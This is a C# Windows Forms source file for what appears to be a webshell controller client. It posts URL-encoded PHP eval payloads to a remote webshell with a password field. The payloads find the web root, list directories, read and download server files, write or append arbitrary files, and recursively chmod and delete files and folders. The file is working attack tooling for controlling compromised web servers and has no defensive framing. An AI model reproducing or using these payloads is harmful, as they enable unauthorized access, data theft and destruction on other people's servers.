using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net;
using Newtonsoft.Json.Linq;
using Newtonsoft.Json;
using System.Web;
using System.IO;
using System.Text.RegularExpressions;

namespace 管理
{
    public partial class Form3 : Form
    {
        public Form3()
        {
            InitializeComponent();
        }

        //http链接
        private string strValue;
        //密码
        private string strPwd;

        public string StrValue
        {
            set
            {
                strValue = value;
            }
        }
        public string StrPwd
        {
            set
            {
                strPwd = value;
            }
        }
        // From4
        

        //全局变量
        public string fileNamePublic; //目录+文件名变量
        public string WebRoot; //网站根目录变量
        public string resp;//post请求返回变量
        public string files;//新建文件的名字变量
        public string content;//新建文件的内容变量
       // public string str;//public类型的实例字段
        public string strfile;//上传文件名的变量
        public string fileContent;//文件上传的内容
        public string contxt;


        public string TextBox1Value
        {
            set { files = value; }
            get { return files; }
        }


        public string TextBox2Value
        {
            set { content = value; }
            get { return content; }
        }

    

        private void Form3_Load(object sender, EventArgs e)
        {


            //   MessageBox.Show(strValue);//显示返回的值
            // MessageBox.Show(strPwd);//显示返回的值
            //获取网站根目录
            //  string web = "@ini_set('display_errors','0');@set_time_limit(0);@set_magic_quotes_runtime(0);echo(\"->| \");$D=dirname($_SERVER[\"SCRIPT_FILENAME\"]);if($D==""){$D=dirname($_SERVER[\"PATH_TRANSLATED\"]);}$arr = array(\"WebRoot\" => $D);echo json_encode($arr);echo(\" |< -\");die();";

            try
            {

                System.Net.HttpWebRequest request;
                request = (System.Net.HttpWebRequest)WebRequest.Create(strValue);
                //Post请求方式
                request.Method = "POST";
                // 内容类型
                request.ContentType = "application/x-www-form-urlencoded";
                // 参数经过URL编码
                string paraUrlCoded = (strPwd);
                paraUrlCoded += "=" + ("@ini_set('display_errors','0');@set_time_limit(0);@set_magic_quotes_runtime(0);$D=dirname($_SERVER[%22SCRIPT_FILENAME%22]);if($D==%22%22)%7B$D=dirname($_SERVER[%22PATH_TRANSLATED%22]);%7D$arr%20=%20array(%22WebRoot%22%20=%3E%20$D);echo%20json_encode($arr);die();");
                byte[] payload;
                //将URL编码后的字符串转化为字节
                payload = System.Text.Encoding.UTF8.GetBytes(paraUrlCoded);
                //设置请求的 ContentLength 
                request.ContentLength = payload.Length;
                //获得请 求流
                System.IO.Stream writer = request.GetRequestStream();
                //将请求参数写入流
                writer.Write(payload, 0, payload.Length);
                // 关闭请求流
                writer.Close();
                System.Net.HttpWebResponse response;
                // 获得响应流
                response = (System.Net.HttpWebResponse)request.GetResponse();
                System.IO.StreamReader myreader = new System.IO.StreamReader(response.GetResponseStream(), Encoding.UTF8);
                string responseText = myreader.ReadToEnd();
                myreader.Close();

                JObject jok = JObject.Parse(responseText);
                WebRoot = jok["WebRoot"].ToString();
                textBox1.Text = jok["WebRoot"].ToString();
                string drive = jok["WebRoot"].ToString();


                


                // MessageBox.Show(paths);
                // weblist(textBox1.Text);
                /* TreeNode tn_1 = new TreeNode();
                  tn_1.Text = drive.Substring(0, 3);
                  tn_1.Nodes.Add(drive.Substring(0, 3));
                  tn_1.ImageIndex = 0;  // //设置图标
                  treeView1.Nodes.Add(tn_1);*/
                 weblist(jok["WebRoot"].ToString());

                //treeView1 设置
            
                TreeNode node = this.treeView1.Nodes.Add(resp.Substring(resp.LastIndexOf("\\") + 1));

                SetTreeViewNode(resp, node);



            }
            catch
            {
                MessageBox.Show("网络错误或者密码不对！");
            }

        }


        public void weblist(string WebRoot)
        {
            try
            {
                System.Net.HttpWebRequest request;
                request = (System.Net.HttpWebRequest)WebRequest.Create(strValue);
                //Post请求方式
                request.Method = "POST";
                // 内容类型
                request.ContentType = "application/x-www-form-urlencoded";
                // 参数经过URL编码
                string paraUrlCoded = (strPwd);

                paraUrlCoded += "=@eval(($_POST[z0]));&z0=" + ("@ini_set('display_errors','0');@set_time_limit(0);@set_magic_quotes_runtime(0);$D%3d($_POST[%22z1%22]);$F%3dopendir($D);%20if($F%3d%3dNULL)%7Becho(%22ERROR://%20Path%20Not%20Found%20Or%20No%20Permission!%22);%7Delse%7B$tmparr%20%3d%20array();while($N%3dreaddir($F))%7B$P%3d$D.%22/%22.$N;$T%3ddate(%22Y-m-d%20H:i:s%22,filemtime($P));$E%3dsubstr(base_convert(fileperms($P),10,8),-4);$arr%20%3d%20array(%22time%22%20%3d%3E%20$T,%20%22size%22%20%3d%3E%20filesize($P),%22root%22%20%3d%3E%20$E,%22path%22%20%3d%3Eurlencode(is_dir($P)?$N.%22/%22:$N));$tmparr[]%20%3d%20$arr;}echo%20json_encode($tmparr);closedir($F);};") + "&z1=" + WebRoot;

                byte[] payload;
                //将URL编码后的字符串转化为字节
                payload = System.Text.Encoding.UTF8.GetBytes(paraUrlCoded);
                //设置请求的 ContentLength 
                request.ContentLength = payload.Length;
                //获得请 求流
                System.IO.Stream writer = request.GetRequestStream();
                //将请求参数写入流
                writer.Write(payload, 0, payload.Length);
                // 关闭请求流
                writer.Close();
                System.Net.HttpWebResponse response;
                // 获得响应流
                response = (System.Net.HttpWebResponse)request.GetResponse();
                System.IO.StreamReader myreader = new System.IO.StreamReader(response.GetResponseStream(), Encoding.UTF8);
                string responseTexts = myreader.ReadToEnd();
                myreader.Close();

                //JObject jok = JObject.Parse(responseTexts);
                //字符串数组转换jArray数组
                JArray lstRole = (JArray)JsonConvert.DeserializeObject(responseTexts);

                foreach (var s in lstRole)
                {
                    JObject txt = JObject.Parse(s.ToString());//解析json数据
                    ListViewItem item = new ListViewItem();
                    string rp = txt["path"].ToString().Replace("..//", "").Replace(".//", "");
                    contxt = txt["path"].ToString();//返回值
                    item.SubItems[0].Text = System.Web.HttpUtility.UrlDecode(txt["path"].ToString());
                    item.SubItems.Add(txt["time"].ToString());
                    item.SubItems.Add(txt["size"].ToString());
                    item.SubItems.Add(txt["root"].ToString());
                    listView1.Items.Add(item);
                }


            }
            catch
            {
                return;
               
            }


        }
        //http请求
        public void post(string load)
        {

            System.Net.HttpWebRequest request;
            request = (System.Net.HttpWebRequest)WebRequest.Create(strValue);
            //Post请求方式
            request.Method = "POST";
            // 内容类型
            request.ContentType = "application/x-www-form-urlencoded";
            // 参数经过URL编码
            string paraUrlCoded = (strPwd);

            paraUrlCoded += "="+ load; //拼接payload 
            //MessageBox.Show(paraUrlCoded);
            byte[] payload;
            //将URL编码后的字符串转化为字节
            payload = System.Text.Encoding.UTF8.GetBytes(paraUrlCoded);
            //设置请求的 ContentLength 
            request.ContentLength = payload.Length;
            //获得请 求流
            System.IO.Stream writer = request.GetRequestStream();
            //将请求参数写入流
            writer.Write(payload, 0, payload.Length);
            // 关闭请求流
            writer.Close();
            System.Net.HttpWebResponse response;
            // 获得响应流
            response = (System.Net.HttpWebResponse)request.GetResponse();
            System.IO.StreamReader myreader = new System.IO.StreamReader(response.GetResponseStream(), Encoding.UTF8);
            string responseTexts = myreader.ReadToEnd();
            myreader.Close();
            resp = responseTexts;

        }

        //TreeView 添加数据函数
        public void SetTreeViewNode(string path, TreeNode node)
        {
            //resp = path;
            foreach (var item in path)
            {
                //var childrenNode = 
                node.Nodes.Add(item.ToString().Substring(item.ToString().LastIndexOf("\\")+1));
                //SetTreeViewNode(item.ToString(), childrenNode);
            }
            
           /* var f = Directory.GetFiles(path);
            foreach(var filetxet in f)
            {
                node.Nodes.Add(filetxet.Substring(filetxet.LastIndexOf("\\") + 1));
              
            }*/
        }

        //鼠标点击事件
        private void listView1_MouseClick(object sender, MouseEventArgs e)
        {
            //禁止多选
            listView1.MultiSelect = false;
            //鼠标右键
            if(e.Button == MouseButtons.Right)
            {
                String filename = listView1.SelectedItems[0].Text; //获取选中的文件名
                Point p = new Point(e.X, e.Y);
                contextMenuStrip1.Show(listView1, p);
            }
        }
        //删除文件点击操作
        private void delFile_Click(object sender, EventArgs e)
        {
            //文件没有被选中
            if (this.listView1.SelectedItems.Count ==0)
            {
                return;
            }
            //获取选中文件
            var selectedItem = this.listView1.SelectedItems[0];

            //组合文件名 根目录加文件名
            fileNamePublic = WebRoot + "/" + selectedItem.SubItems[0].Text;
            //MessageBox.Show(fileNamePublic);

            //设置异常获取
            try
            {
                string payload = "@ini_set('display_errors','0');@set_time_limit(0);@set_magic_quotes_runtime(0);function%20df($p)%7B$m%3d@dir($p);while(@$f%3d$m-%3Eread())%7B$pf%3d$p.%22/%22.$f;if((is_dir($pf))%26%26($f!%3d%22.%22)%26%26($f!%3d%22..%22))%7B@chmod($pf,0777);df($pf);%7Dif(is_file($pf))%7B@chmod($pf,0777);@unlink($pf);%7D%7D$m-%3Eclose();@chmod($p,0777);return%20@rmdir($p);%7D$F%3dget_magic_quotes_gpc()?stripslashes($_POST[%22z1%22]):$_POST[%22z1%22];if(is_dir($F))echo(df($F));else{echo(file_exists($F)?@unlink($F)?%221%22:%220%22:%220%22);}" + "&z1="+fileNamePublic;
                post(payload);//发送post 请求
                if (resp =="1")
                {
                    MessageBox.Show("文件删除成功");
                    //移除listview 列表被选中的值
                    foreach (ListViewItem item in listView1.SelectedItems)
                    {
                        this.listView1.Items.Remove(item);
                    }
                 
                }
                else
                {
                    MessageBox.Show("文件删除失败");
                }
            }
            catch
            {
                MessageBox.Show("出现错误");
            }

        }

        //新建文件函数
        private void rfile_Click(object sender, EventArgs e)
        {

            Form4 lForm = new Form4();
            lForm.Owner = this;//重要的一步，主要是使Form2的Owner指针指向Form1
            lForm.ShowDialog();
            //MessageBox.Show(TextBox1Value);
            //组合文件名 根目录加文件名
            fileNamePublic = WebRoot + "/" + TextBox1Value;
            try
            {
                string payload ="echo @fwrite(fopen($_POST[\"z1\"],\"w\"),$_POST[\"z2\"])?\"1\":\"0\";" + "&z1="+fileNamePublic+"&z2="+ TextBox2Value;
                //MessageBox.Show(payload);
                post(payload);
                if (resp =="1")
                {
                    MessageBox.Show("新建文件成功");
                   
                    this.listView1.Items.Add(TextBox1Value);
                    
                }
                if (resp == "0")
                {
                    MessageBox.Show("新建文件失败");
                }
               
            }
            catch
            {
                MessageBox.Show("新建文件出错！");
            }

        }

       
    
        //查看文件函数
        private void 查看文件ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            //文件没有被选中
            if (this.listView1.SelectedItems.Count == 0)
            {
                return;
            }
            //获取选中文件
            var selectedItem = this.listView1.SelectedItems[0];

            //组合文件名 根目录加文件名
            fileNamePublic = WebRoot + "/" + selectedItem.SubItems[0].Text;

            try {
                string payload = "@ini_set('display_errors','0');@set_time_limit(0);@set_magic_quotes_runtime(0);$F=$_POST[%22z1%22];$P=@fopen($F,%22r%22);echo(@fread($P,filesize($F)));@fclose($P);"+"&z1="+ fileNamePublic;
                post(payload);
                Form5 f5 = new Form5();
                f5.str = fileNamePublic;
                f5.strcontent = resp;
                f5.strValue = strValue;
                f5.strPwd = strPwd;
                f5.ShowDialog();
                

            } catch
            {
                MessageBox.Show("error");
            }
        }

        //下载文件函数
        private void DownloadFile_Click(object sender, EventArgs e)
        {
            //文件没有被选中
            if (this.listView1.SelectedItems.Count == 0)
            {
                return;
            }
            //获取选中文件
            var selectedItem = this.listView1.SelectedItems[0];

            //组合文件名 根目录加文件名
            fileNamePublic = WebRoot + "/" + selectedItem.SubItems[0].Text;
            try
            {
                string payload = "@ini_set('display_errors','0');@set_time_limit(0);@set_magic_quotes_runtime(0);$F=$_POST[%22z1%22];$P=@fopen($F,%22r%22);echo(@fread($P,filesize($F)));@fclose($P);" + "&z1=" + fileNamePublic;
                post(payload);

                //选中文件下载
                SaveFileDialog sfd = new SaveFileDialog();
                //设置保存文件对话框的标题
                sfd.Title = "请选择要保存的文件路径";
                //初始化保存目录，默认exe文件目录
                sfd.InitialDirectory = Application.StartupPath;
                //设置保存文件的类型
                sfd.Filter = "Text Files (*.txt)|*.txt|All Files (*.*)|*.*";
                //文件名
                sfd.FileName = selectedItem.SubItems[0].Text;
              

                if (sfd.ShowDialog() == DialogResult.OK)
                {
                    //获得保存文件的路径
                    string filePath = selectedItem.SubItems[0].Text;
                    // sfd.FileName = selectedItem.SubItems[0].Text;
                    //保存
                    using (FileStream fsWrite = new FileStream(sfd.FileName, FileMode.OpenOrCreate, FileAccess.Write))
                    {
                        byte[] buffer = Encoding.Default.GetBytes(resp);
                        fsWrite.Write(buffer, 0, buffer.Length);
                        MessageBox.Show(sfd.FileName,"文件下载成功");
                    }
                }
            }
            catch
            {
                MessageBox.Show("Error");
            }
            





        }

        //上传文件函数
        private void 上传文件ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            //选中上传的文件
            OpenFileDialog fileDialog = new OpenFileDialog();
            fileDialog.Multiselect = true;
            fileDialog.Title = "请选择文件";
            fileDialog.Filter = "Text Files (*.txt)|*.txt|All Files (*.*)|*.*"; //设置要选择的文件的类型
            if (fileDialog.ShowDialog() == DialogResult.OK)
            {
                string file = fileDialog.FileName;//返回文件的完整路径 
                string[] filename = file.Split('\\');
                foreach(var s in filename)
                {
                    strfile = s;
                }
                //MessageBox.Show(strfile);
                //组合文件名 根目录加文件名
                fileNamePublic = WebRoot + "/"+ strfile;
                using (StreamReader reader = new StreamReader(file))
                {
                    fileContent = reader.ReadToEnd();
                }
                try {

                 //发送pyalod 上传文件
                  string payload = "echo @fwrite(fopen($_POST[\"z1\"],\"a\"),$_POST[\"z2\"])?\"1\":\"0\";" + "&z1=" + fileNamePublic + "&z2=" + fileContent;
                  post(payload);
                 if(resp == "1")
                    {
                        this.listView1.Items.Add(strfile);
                        MessageBox.Show(fileNamePublic, "文件上传成功");
                    }else
                    {
                        MessageBox.Show("文件上传失败");
                    }

                } catch
                {
                    MessageBox.Show("Error");
                }
                


            }

            
        }

        private void button1_Click_1(object sender, EventArgs e)
        {
          
        }

        //cmd 终端
        private void Cmd_Click(object sender, EventArgs e)
        {

        }


    }
}
